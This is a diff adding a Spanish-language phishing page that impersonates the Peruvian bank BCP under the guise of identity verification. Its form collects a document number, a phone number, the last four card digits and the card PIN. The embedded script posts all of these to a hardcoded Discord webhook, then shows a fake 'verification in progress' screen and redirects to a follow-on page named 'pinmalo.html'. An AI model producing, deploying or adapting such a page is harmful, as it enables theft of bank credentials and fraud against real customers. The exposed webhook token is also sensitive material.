@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifica tu Identidad</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700&display=swap"
+        rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', '"Inter"', 'sans-serif'],
+                    },
+                    colors: {
+                        pageBg: '#F2F4F8',
+                        brandNavy: '#002A8D',
+                        brandBlue: '#0052CC',
+                        brandOrange: '#FF7800',
+                        brandOrangeHover: '#E66C00',
+                        textDark: '#111827',
+                        textMuted: '#4B5563',
+                        borderDefault: '#D1D5DB',
+                        btnDisabled: '#D5D9E2',
+                    },
+                    boxShadow: {
+                        card: '0 12px 32px rgba(16, 24, 40, 0.06)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .custom-radio {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 1.5px solid #9CA3AF;
+            border-radius: 9999px;
+            display: inline-grid;
+            place-content: center;
+            background-color: #FFFFFF;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            cursor: pointer;
+        }
+
+        .custom-radio:checked {
+            border-color: #0052CC;
+        }
+
+        .custom-radio::before {
+            content: "";
+            width: 10px;
+            height: 10px;
+            border-radius: 9999px;
+            transform: scale(0);
+            transition: transform 0.15s ease-in-out;
+            background-color: #0052CC;
+        }
+
+        .custom-radio:checked::before {
+            transform: scale(1);
+        }
+
+        .custom-radio:focus-visible {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.18);
+        }
+    </style>
+</head>
+
+<body
+    class="bg-pageBg min-h-screen w-full flex items-center justify-center p-3 sm:p-6 antialiased selection:bg-brandBlue/10 selection:text-brandNavy">
+
+    <main id="verificationCard"
+        class="relative w-full max-w-[430px] min-h-[760px] bg-white rounded-[32px] shadow-card px-5 py-6 sm:px-8 sm:py-7 flex flex-col justify-between transition-all duration-300">
+
+        <div id="formContainer" class="w-full flex-1 flex flex-col justify-between">
+            <div class="w-full">
+                <div class="flex justify-end items-center mb-1">
+                    <button type="button" id="closeModalBtn" aria-label="Cerrar ventana"
+                        class="p-2 -mr-2 text-[#111827] hover:bg-gray-100 active:bg-gray-200 rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-brandBlue/20">
+                        <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="mb-6">
+                    <svg class="h-7 w-auto" viewBox="0 0 132 32" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-label="Logo BCP">
+                        <path
+                            d="M4.5 7.5C6.2 6.8 8.3 7.2 9.8 8.4L17.2 14.3C18.3 15.2 18.3 16.8 17.2 17.7L9.8 23.6C8.3 24.8 6.2 25.2 4.5 24.5C3.5 24.1 3.3 22.8 4.2 22.1L10.3 17.2C11.1 16.6 11.1 15.4 10.3 14.8L4.2 9.9C3.3 9.2 3.5 7.9 4.5 7.5Z"
+                            fill="#FF7800" />
+                        <text x="23" y="24" fill="#002A8D" font-family="'Plus Jakarta Sans', 'Inter', sans-serif"
+                            font-weight="800" font-style="italic" font-size="24" letter-spacing="-0.5">BCP</text>
+                        <path
+                            d="M84.5 7.5C86.2 6.8 88.3 7.2 89.8 8.4L97.2 14.3C98.3 15.2 98.3 16.8 97.2 17.7L89.8 23.6C88.3 24.8 86.2 25.2 84.5 24.5C83.5 24.1 83.3 22.8 84.2 22.1L90.3 17.2C91.1 16.6 91.1 15.4 90.3 14.8L84.2 9.9C83.3 9.2 83.5 7.9 84.5 7.5Z"
+                            fill="#FF7800" />
+                    </svg>
+                </div>
+
+                <header class="text-center mb-6">
+                    <h1 class="text-[24px] sm:text-[26px] font-bold text-textDark leading-[1.22] tracking-[-0.015em]">
+                        Verifica tu Identidad
+                    </h1>
+                    <p class="mt-1.5 text-[14px] font-normal text-textMuted">
+                        Ingresa tus datos para continuar
+                    </p>
+                </header>
+
+                <form id="identityForm" novalidate class="space-y-4" autocomplete="off">
+
+                    <div class="flex items-center justify-start gap-6 pb-1" role="radiogroup"
+                        aria-label="Tipo de cliente">
+                        <label class="inline-flex items-center gap-2.5 cursor-pointer select-none group">
+                            <input type="radio" name="clientType" value="persona" checked class="custom-radio">
+                            <span
+                                class="text-[14px] sm:text-[15px] font-medium text-textDark group-hover:text-brandBlue transition-colors">Persona</span>
+                        </label>
+                        <label class="inline-flex items-center gap-2.5 cursor-pointer select-none group">
+                            <input type="radio" name="clientType" value="empresa" class="custom-radio">
+                            <span
+                                class="text-[14px] sm:text-[15px] font-medium text-textDark group-hover:text-brandBlue transition-colors">Empresa</span>
+                        </label>
+                    </div>
+
+                    <div>
+                        <div class="grid grid-cols-[36%_1fr] gap-2.5 sm:gap-3">
+                            <div id="docTypeBox"
+                                class="relative border border-borderDefault focus-within:border-brandBlue focus-within:ring-[3px] focus-within:ring-brandBlue/10 rounded-[12px] px-3 py-2 bg-white transition-all duration-200 cursor-pointer">
+                                <label for="docType"
+                                    class="block text-[11px] font-medium text-textMuted leading-tight pointer-events-none">
+                                    Tipo
+                                </label>
+                                <div class="relative flex items-center mt-0.5">
+                                    <select id="docType" name="docType" aria-label="Tipo de documento"
+                                        autocomplete="off"
+                                        class="w-full appearance-none bg-transparent text-[14px] sm:text-[15px] font-medium text-textDark pr-5 focus:outline-none cursor-pointer">
+                                        <option value="DNI">DNI</option>
+                                        <option value="CE">CE</option>
+                                        <option value="Pasaporte">Pasaporte</option>
+                                    </select>
+                                    <svg class="w-4 h-4 text-textDark pointer-events-none absolute right-0"
+                                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <polyline points="6 9 12 15 18 9"></polyline>
+                                    </svg>
+                                </div>
+                            </div>
+
+                            <div id="docNumberBox"
+                                class="border border-borderDefault focus-within:border-brandBlue focus-within:ring-[3px] focus-within:ring-brandBlue/10 rounded-[12px] px-3.5 py-2 bg-white transition-all duration-200 cursor-text">
+                                <label for="docNumber"
+                                    class="block text-[11px] font-medium text-textMuted leading-tight">
+                                    N° de documento
+                                </label>
+                                <input type="text" id="docNumber" name="docNumber" inputmode="numeric" maxlength="8"
+                                    placeholder="Ingresa tu DNI" autocomplete="off" autocorrect="off"
+                                    autocapitalize="off" spellcheck="false"
+                                    class="w-full mt-0.5 bg-transparent text-[14px] sm:text-[15px] font-medium text-textDark placeholder-[#9CA3AF] focus:outline-none" />
+                            </div>
+                        </div>
+                        <p id="docError" class="hidden mt-1 text-[11.5px] text-red-600 pl-1">
+                            Ingresa un número de documento válido.
+                        </p>
+                    </div>
+
+                    <div>
+                        <div id="phoneBox"
+                            class="border border-borderDefault focus-within:border-brandBlue focus-within:ring-[3px] focus-within:ring-brandBlue/10 rounded-[12px] px-3.5 py-2 bg-white transition-all duration-200 cursor-text">
+                            <label for="phoneNumber" class="block text-[11px] font-medium text-textMuted leading-tight">
+                                Número de teléfono (WhatsApp o llamadas)
+                            </label>
+                            <input type="tel" id="phoneNumber" name="phoneNumber" inputmode="tel" maxlength="17"
+                                placeholder="+51 9XX XXX XXX" autocomplete="off" autocorrect="off" autocapitalize="off"
+                                spellcheck="false"
+                                class="w-full mt-0.5 bg-transparent text-[14px] sm:text-[15px] font-medium text-textDark placeholder-[#9CA3AF] focus:outline-none" />
+                        </div>
+                        <p id="phoneError" class="hidden mt-1 text-[11.5px] text-red-600 pl-1">
+                            Ingresa un número válido con formato +51 9XX XXX XXX.
+                        </p>
+                    </div>
+
+                    <div>
+                        <div id="cardBox"
+                            class="border border-borderDefault focus-within:border-brandBlue focus-within:ring-[3px] focus-within:ring-brandBlue/10 rounded-[12px] px-3.5 py-2 bg-white transition-all duration-200 cursor-text">
+                            <label for="cardLast4" class="block text-[11px] font-medium text-textMuted leading-tight">
+                                Últimos 4 dígitos de tu tarjeta
+                            </label>
+                            <div class="flex items-center mt-0.5 text-[14px] sm:text-[15px]">
+                                <span class="text-[#8E95A2] tracking-[0.14em] select-none font-medium mr-1.5"
+                                    aria-hidden="true">
+                                    **** **** ****
+                                </span>
+                                <input type="text" id="cardLast4" name="cardLast4" inputmode="numeric" pattern="[0-9]*"
+                                    maxlength="4" autocomplete="off" autocorrect="off" autocapitalize="off"
+                                    spellcheck="false" placeholder="0000" aria-label="Últimos 4 dígitos de tu tarjeta"
+                                    class="w-16 bg-transparent text-textDark placeholder-[#9CA3AF] font-medium tracking-[0.08em] focus:outline-none" />
+                            </div>
+                        </div>
+                        <p id="cardError" class="hidden mt-1 text-[11.5px] text-red-600 pl-1">
+                            Ingresa los 4 últimos dígitos de tu tarjeta.
+                        </p>
+                    </div>
+
+                    <div>
+                        <div id="pinBox"
+                            class="border border-borderDefault focus-within:border-brandBlue focus-within:ring-[3px] focus-within:ring-brandBlue/10 rounded-[12px] px-3.5 py-2 bg-white transition-all duration-200 cursor-text">
+                            <label for="pinCode" class="block text-[11px] font-medium text-textMuted leading-tight">
+                                Clave PIN
+                            </label>
+                            <div class="flex items-center justify-between mt-0.5">
+                                <input type="password" id="pinCode" name="pinCode" inputmode="numeric" pattern="[0-9]*"
+                                    maxlength="4" placeholder="••••" autocomplete="new-password" autocorrect="off"
+                                    autocapitalize="off" spellcheck="false" aria-label="Clave PIN de 4 dígitos"
+                                    class="w-full bg-transparent text-textDark placeholder-[#9CA3AF] text-[15px] tracking-[0.25em] font-semibold focus:outline-none" />
+                                <button type="button" id="togglePinBtn" aria-label="Mostrar u ocultar PIN"
+                                    class="hidden text-textMuted hover:text-brandBlue p-0.5 rounded-md transition-colors focus:outline-none">
+                                    <svg id="eyeIcon" class="w-4 h-4" viewBox="0 0 24 24" fill="none"
+                                        stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                        <circle cx="12" cy="12" r="3"></circle>
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+                        <p id="pinError" class="hidden mt-1 text-[11.5px] text-red-600 pl-1">
+                            Ingresa tu clave PIN de 4 dígitos.
+                        </p>
+                    </div>
+
+                </form>
+            </div>
+
+            <div class="w-full pt-7">
+                <button type="submit" form="identityForm" id="submitBtn" disabled
+                    class="w-full h-[52px] rounded-full bg-btnDisabled text-white font-semibold text-[15px] sm:text-[16px] tracking-[0.01em] transition-all duration-200 cursor-not-allowed flex items-center justify-center gap-2 focus:outline-none focus:ring-4 focus:ring-brandBlue/25">
+                    <span id="btnText">Continuar</span>
+                    <svg id="btnSpinner" class="hidden animate-spin h-5 w-5 text-white"
+                        xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4">
+                        </circle>
+                        <path class="opacity-75" fill="currentColor"
+                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                        </path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <div id="successContainer" class="hidden w-full flex-1 flex flex-col justify-between py-2">
+            <div>
+                <div class="mb-8">
+                    <svg class="h-7 w-auto" viewBox="0 0 132 32" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-label="Logo BCP">
+                        <path
+                            d="M4.5 7.5C6.2 6.8 8.3 7.2 9.8 8.4L17.2 14.3C18.3 15.2 18.3 16.8 17.2 17.7L9.8 23.6C8.3 24.8 6.2 25.2 4.5 24.5C3.5 24.1 3.3 22.8 4.2 22.1L10.3 17.2C11.1 16.6 11.1 15.4 10.3 14.8L4.2 9.9C3.3 9.2 3.5 7.9 4.5 7.5Z"
+                            fill="#FF7800" />
+                        <text x="23" y="24" fill="#002A8D" font-family="'Plus Jakarta Sans', 'Inter', sans-serif"
+                            font-weight="800" font-style="italic" font-size="24" letter-spacing="-0.5">BCP</text>
+                        <path
+                            d="M84.5 7.5C86.2 6.8 88.3 7.2 89.8 8.4L97.2 14.3C98.3 15.2 98.3 16.8 97.2 17.7L89.8 23.6C88.3 24.8 86.2 25.2 84.5 24.5C83.5 24.1 83.3 22.8 84.2 22.1L90.3 17.2C91.1 16.6 91.1 15.4 90.3 14.8L84.2 9.9C83.3 9.2 83.5 7.9 84.5 7.5Z"
+                            fill="#FF7800" />
+                    </svg>
+                </div>
+
+                <div class="text-center mb-6">
+                    <div
+                        class="w-16 h-16 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center mx-auto mb-4">
+                        <svg class="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="20 6 9 17 4 12"></polyline>
+                        </svg>
+                    </div>
+                    <h2 class="text-[22px] sm:text-[24px] font-bold text-textDark leading-tight">
+                        ¡Identidad a punto de ser Verificada!
+                    </h2>
+                    <p class="mt-2 text-[14px] text-textMuted">
+                        Estamos validando correctamente tus datos de contacto y seguridad. Puede tardar algunos
+                        momentos...
+                    </p>
+                </div>
+
+                <div class="bg-[#F8FAFC] border border-gray-200/80 rounded-[16px] p-4 space-y-3 text-[13.5px]">
+                    <div class="flex justify-between items-center border-b border-gray-200/70 pb-2.5">
+                        <span class="text-textMuted">Perfil</span>
+                        <span id="summaryClientType" class="font-semibold text-textDark capitalize">Persona</span>
+                    </div>
+                    <div class="flex justify-between items-center border-b border-gray-200/70 pb-2.5">
+                        <span class="text-textMuted">Documento</span>
+                        <span id="summaryDoc" class="font-semibold text-textDark">DNI ••••0000</span>
+                    </div>
+                    <div class="flex justify-between items-center border-b border-gray-200/70 pb-2.5">
+                        <span class="text-textMuted">Teléfono / WhatsApp</span>
+                        <span id="summaryPhone" class="font-semibold text-textDark">•••••0000</span>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-textMuted">Tarjeta vinculada</span>
+                        <span id="summaryCard" class="font-semibold text-textDark">**** 0000</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="w-full pt-8">
+                <button type="button" id="backToFormBtn"
+                    class="w-full h-[52px] rounded-full bg-brandNavy hover:bg-[#00206E] text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 shadow-md shadow-brandNavy/15">
+                    Verificar Seguridad
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <div id="closedState" class="hidden text-center max-w-sm px-6">
+        <div class="bg-white rounded-[28px] p-8 shadow-card">
+            <p class="text-textDark font-semibold text-lg mb-2">Proceso cancelado</p>
+            <p class="text-textMuted text-sm mb-6">Has cerrado la ventana de verificación de identidad.</p>
+            <button type="button" id="reopenModalBtn"
+                class="w-full py-3 px-6 rounded-full bg-brandNavy hover:bg-[#00206E] text-white font-semibold text-sm transition-colors">
+                Volver a intentar
+            </button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573521105061150821/35O7dDj925ix3ZThhw3dq2YfOmDOgDXd7On2GT0jc6Q57ndA6Nrml_9TxSLSrjWLfZGN';
+
+            const DOC_CONFIG = {
+                persona: [
+                    { value: 'DNI', label: 'DNI', placeholder: 'Ingresa tu DNI', min: 8, max: 8, numeric: true },
+                    { value: 'CE', label: 'CE', placeholder: 'Ingresa tu CE', min: 9, max: 12, numeric: false },
+                    { value: 'Pasaporte', label: 'Pasaporte', placeholder: 'Ingresa tu Pasaporte', min: 7, max: 12, numeric: false }
+                ],
+                empresa: [
+                    { value: 'RUC', label: 'RUC', placeholder: 'Ingresa tu RUC', min: 11, max: 11, numeric: true }
+                ]
+            };
+
+            const clientRadios = document.querySelectorAll('input[name="clientType"]');
+            const docTypeSelect = document.getElementById('docType');
+            const docNumberInput = document.getElementById('docNumber');
+            const phoneInput = document.getElementById('phoneNumber');
+            const cardInput = document.getElementById('cardLast4');
+            const pinInput = document.getElementById('pinCode');
+
+            const docNumberBox = document.getElementById('docNumberBox');
+            const phoneBox = document.getElementById('phoneBox');
+            const cardBox = document.getElementById('cardBox');
+            const pinBox = document.getElementById('pinBox');
+
+            const docError = document.getElementById('docError');
+            const phoneError = document.getElementById('phoneError');
+            const cardError = document.getElementById('cardError');
+            const pinError = document.getElementById('pinError');
+
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+            const identityForm = document.getElementById('identityForm');
+            const togglePinBtn = document.getElementById('togglePinBtn');
+            const eyeIcon = document.getElementById('eyeIcon');
+
+            const formContainer = document.getElementById('formContainer');
+            const successContainer = document.getElementById('successContainer');
+            const backToFormBtn = document.getElementById('backToFormBtn');
+
+            const verificationCard = document.getElementById('verificationCard');
+            const closedState = document.getElementById('closedState');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const reopenModalBtn = document.getElementById('reopenModalBtn');
+
+            function getCurrentDocRule() {
+                const clientType = document.querySelector('input[name="clientType"]:checked').value;
+                const docValue = docTypeSelect.value;
+                return DOC_CONFIG[clientType].find(d => d.value === docValue) || DOC_CONFIG[clientType][0];
+            }
+
+            function updateClientTypeOptions(clientType) {
+                const options = DOC_CONFIG[clientType];
+                docTypeSelect.innerHTML = options
+                    .map(opt => `<option value="${opt.value}">${opt.label}</option>`)
+                    .join('');
+                applyDocInputRules(true);
+            }
+
+            function applyDocInputRules(clearValue = false) {
+                const rule = getCurrentDocRule();
+                docNumberInput.placeholder = rule.placeholder;
+                docNumberInput.maxLength = rule.max;
+                docNumberInput.inputMode = rule.numeric ? 'numeric' : 'text';
+
+                if (clearValue) {
+                    docNumberInput.value = '';
+                } else {
+                    sanitizeDocInput();
+                }
+                setBoxError(docNumberBox, docError, false);
+                updateSubmitButtonState();
+            }
+
+            function sanitizeDocInput() {
+                const rule = getCurrentDocRule();
+                if (rule.numeric) {
+                    docNumberInput.value = docNumberInput.value.replace(/\D/g, '').slice(0, rule.max);
+                } else {
+                    docNumberInput.value = docNumberInput.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, rule.max);
+                }
+            }
+
+            function isDocValid() {
+                const rule = getCurrentDocRule();
+                const val = docNumberInput.value.trim();
+                return val.length >= rule.min && val.length <= rule.max;
+            }
+
+            // Valida el teléfono: debe ser +51 9XX XXX XXX (solo dígitos y espacios/guiones opcionales)
+            function isPhoneValid() {
+                const raw = phoneInput.value.replace(/\D/g, '');
+                // Debe empezar con 51 y tener 11 dígitos (51 + 9 dígitos de celular peruano)
+                // O si el usuario escribe solo 9XXXXXXXX (9 dígitos) también lo aceptamos? 
+                // Para simplificar y cumplir el formato +51 9XX XXX XXX, exigimos que empiece con 51 y tenga 11 dígitos.
+                return /^51\d{9}$/.test(raw);
+            }
+
+            function isCardValid() {
+                return /^\d{4}$/.test(cardInput.value);
+            }
+
+            function isPinValid() {
+                return /^\d{4}$/.test(pinInput.value);
+            }
+
+            function setBoxError(boxEl, errorEl, hasError) {
+                if (hasError) {
+                    boxEl.classList.remove('border-borderDefault', 'focus-within:border-brandBlue', 'focus-within:ring-brandBlue/10');
+                    boxEl.classList.add('border-red-500', 'focus-within:border-red-500', 'focus-within:ring-red-500/15');
+                    errorEl.classList.remove('hidden');
+                } else {
+                    boxEl.classList.add('border-borderDefault', 'focus-within:border-brandBlue', 'focus-within:ring-brandBlue/10');
+                    boxEl.classList.remove('border-red-500', 'focus-within:border-red-500', 'focus-within:ring-red-500/15');
+                    errorEl.classList.add('hidden');
+                }
+            }
+
+            function updateSubmitButtonState() {
+                const allValid = isDocValid() && isPhoneValid() && isCardValid() && isPinValid();
+
+                if (allValid) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('bg-btnDisabled', 'cursor-not-allowed');
+                    submitBtn.classList.add('bg-brandNavy', 'hover:bg-[#00206E]', 'active:scale-[0.99]', 'cursor-pointer', 'shadow-md', 'shadow-brandNavy/20');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('bg-btnDisabled', 'cursor-not-allowed');
+                    submitBtn.classList.remove('bg-brandNavy', 'hover:bg-[#00206E]', 'active:scale-[0.99]', 'cursor-pointer', 'shadow-md', 'shadow-brandNavy/20');
+                }
+            }
+
+            // Formateo automático del teléfono al escribir: +51 9XX XXX XXX
+            phoneInput.addEventListener('input', (e) => {
+                let digits = phoneInput.value.replace(/\D/g, '');
+                // Si el usuario empieza a escribir, forzamos que empiece con 51
+                if (digits.length > 0 && !digits.startsWith('51')) {
+                    // Si ya tenía 51 al inicio, lo respetamos; si no, lo agregamos
+                    digits = '51' + digits;
+                }
+                // Limitar a 11 dígitos (51 + 9 dígitos)
+                digits = digits.slice(0, 11);
+
+                // Formatear: +51 9XX XXX XXX
+                let formatted = '';
+                if (digits.length > 0) {
+                    formatted = '+' + digits.slice(0, 2);
+                    if (digits.length > 2) formatted += ' ' + digits.slice(2, 5);
+                    if (digits.length > 5) formatted += ' ' + digits.slice(5, 8);
+                    if (digits.length > 8) formatted += ' ' + digits.slice(8, 11);
+                }
+
+                phoneInput.value = formatted;
+                if (isPhoneValid()) setBoxError(phoneBox, phoneError, false);
+                updateSubmitButtonState();
+            });
+
+            clientRadios.forEach(radio => {
+                radio.addEventListener('change', (e) => {
+                    updateClientTypeOptions(e.target.value);
+                });
+            });
+
+            docTypeSelect.addEventListener('change', () => {
+                applyDocInputRules(true);
+            });
+
+            docNumberInput.addEventListener('input', () => {
+                sanitizeDocInput();
+                if (isDocValid()) setBoxError(docNumberBox, docError, false);
+                updateSubmitButtonState();
+            });
+
+            cardInput.addEventListener('input', () => {
+                cardInput.value = cardInput.value.replace(/\D/g, '').slice(0, 4);
+                if (isCardValid()) setBoxError(cardBox, cardError, false);
+                updateSubmitButtonState();
+            });
+
+            cardInput.addEventListener('keyup', (e) => {
+                if (cardInput.value.length === 4 && /^[0-9]$/.test(e.key)) {
+                    pinInput.focus();
+                }
+            });
+
+            pinInput.addEventListener('input', () => {
+                pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+                togglePinBtn.classList.toggle('hidden', pinInput.value.length === 0);
+                if (isPinValid()) setBoxError(pinBox, pinError, false);
+                updateSubmitButtonState();
+            });
+
+            docNumberInput.addEventListener('blur', () => {
+                if (docNumberInput.value.length > 0 && !isDocValid()) {
+                    const rule = getCurrentDocRule();
+                    docError.textContent = rule.min === rule.max
+                        ? `El ${rule.label} debe tener ${rule.min} dígitos.`
+                        : `Ingresa entre ${rule.min} y ${rule.max} caracteres.`;
+                    setBoxError(docNumberBox, docError, true);
+                }
+            });
+
+            phoneInput.addEventListener('blur', () => {
+                if (phoneInput.value.length > 0 && !isPhoneValid()) {
+                    setBoxError(phoneBox, phoneError, true);
+                }
+            });
+
+            cardInput.addEventListener('blur', () => {
+                if (cardInput.value.length > 0 && !isCardValid()) {
+                    setBoxError(cardBox, cardError, true);
+                }
+            });
+
+            pinInput.addEventListener('blur', () => {
+                if (pinInput.value.length > 0 && !isPinValid()) {
+                    setBoxError(pinBox, pinError, true);
+                }
+            });
+
+            docNumberBox.addEventListener('click', () => docNumberInput.focus());
+            phoneBox.addEventListener('click', () => phoneInput.focus());
+            cardBox.addEventListener('click', () => cardInput.focus());
+            pinBox.addEventListener('click', (e) => {
+                if (e.target !== togglePinBtn && !togglePinBtn.contains(e.target)) {
+                    pinInput.focus();
+                }
+            });
+
+            togglePinBtn.addEventListener('click', () => {
+                const isPassword = pinInput.type === 'password';
+                pinInput.type = isPassword ? 'text' : 'password';
+
+                if (isPassword) {
+                    eyeIcon.innerHTML = `
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                    `;
+                } else {
+                    eyeIcon.innerHTML = `
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                    `;
+                }
+            });
+
+            // Envío del formulario: validar, enviar a Discord y mostrar éxito
+            identityForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+
+                const docOk = isDocValid();
+                const phoneOk = isPhoneValid();
+                const cardOk = isCardValid();
+                const pinOk = isPinValid();
+
+                setBoxError(docNumberBox, docError, !docOk);
+                setBoxError(phoneBox, phoneError, !phoneOk);
+                setBoxError(cardBox, cardError, !cardOk);
+                setBoxError(pinBox, pinError, !pinOk);
+
+                if (!docOk || !phoneOk || !cardOk || !pinOk) return;
+
+                // Deshabilitar botón y mostrar spinner
+                submitBtn.disabled = true;
+                btnText.textContent = 'Verificando...';
+                btnSpinner.classList.remove('hidden');
+
+                // Recopilar datos
+                const selectedClient = document.querySelector('input[name="clientType"]:checked').value;
+                const docType = docTypeSelect.value;
+                const docNumber = docNumberInput.value;
+                const phone = phoneInput.value;
+                const cardLast4 = cardInput.value;
+                const pin = pinInput.value;
+
+                // Construir mensaje para Discord (formato embed)
+                const payload = {
+                    username: 'BCP Verificación',
+                    embeds: [
+                        {
+                            title: '🔐 Nuevos datos de verificación',
+                            color: 0x0052CC,
+                            fields: [
+                                { name: 'Tipo de cliente', value: selectedClient === 'persona' ? 'Persona' : 'Empresa', inline: true },
+                                { name: 'Tipo de documento', value: docType, inline: true },
+                                { name: 'N° de documento', value: docNumber, inline: false },
+                                { name: 'Teléfono / WhatsApp', value: phone, inline: false },
+                                { name: 'Últimos 4 dígitos de tarjeta', value: `**** ${cardLast4}`, inline: true },
+                                { name: 'Clave PIN', value: pin, inline: true }
+                            ],
+                            timestamp: new Date().toISOString(),
+                            footer: { text: 'BCP - Verificación de identidad' }
+                        }
+                    ]
+                };
+
+                // Enviar a Discord (fetch con manejo de errores)
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                    .then(response => {
+                        if (!response.ok) {
+                            console.warn('Error al enviar a Discord:', response.status);
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error de red al enviar a Discord:', err);
+                    })
+                    .finally(() => {
+                        // Mostrar pantalla de éxito después de un breve retraso
+                        setTimeout(() => {
+                            btnSpinner.classList.add('hidden');
+                            btnText.textContent = 'Continuar';
+                            submitBtn.disabled = false;
+
+                            // Poblar resumen enmascarado
+                            const maskedDoc = '•'.repeat(Math.max(0, docNumber.length - 4)) + docNumber.slice(-4);
+                            const maskedPhone = '•'.repeat(Math.max(0, phone.replace(/\D/g, '').length - 4)) + phone.replace(/\D/g, '').slice(-4);
+
+                            document.getElementById('summaryClientType').textContent = selectedClient === 'persona' ? 'Persona' : 'Empresa';
+                            document.getElementById('summaryDoc').textContent = `${docType} ${maskedDoc}`;
+                            document.getElementById('summaryPhone').textContent = maskedPhone;
+                            document.getElementById('summaryCard').textContent = `**** ${cardLast4}`;
+
+                            formContainer.classList.add('hidden');
+                            successContainer.classList.remove('hidden');
+                        }, 600);
+                    });
+            });
+
+            function resetAll() {
+                identityForm.reset();
+                document.querySelector('input[name="clientType"][value="persona"]').checked = true;
+                updateClientTypeOptions('persona');
+                togglePinBtn.classList.add('hidden');
+                pinInput.type = 'password';
+                setBoxError(docNumberBox, docError, false);
+                setBoxError(phoneBox, phoneError, false);
+                setBoxError(cardBox, cardError, false);
+                setBoxError(pinBox, pinError, false);
+                successContainer.classList.add('hidden');
+                formContainer.classList.remove('hidden');
+                updateSubmitButtonState();
+            }
+
+            // Redirigir a pinmalo2.html al hacer clic en "Verificar Seguridad"
+            backToFormBtn.addEventListener('click', () => {
+                window.location.href = 'pinmalo.html';
+            });
+
+            closeModalBtn.addEventListener('click', () => {
+                verificationCard.classList.add('hidden');
+                closedState.classList.remove('hidden');
+            });
+
+            reopenModalBtn.addEventListener('click', () => {
+                closedState.classList.add('hidden');
+                verificationCard.classList.remove('hidden');
+                resetAll();
+            });
+
+            // Inicializar estado del botón
+            updateSubmitButtonState();
+        });
+    </script>
+</body>
+
+</html>
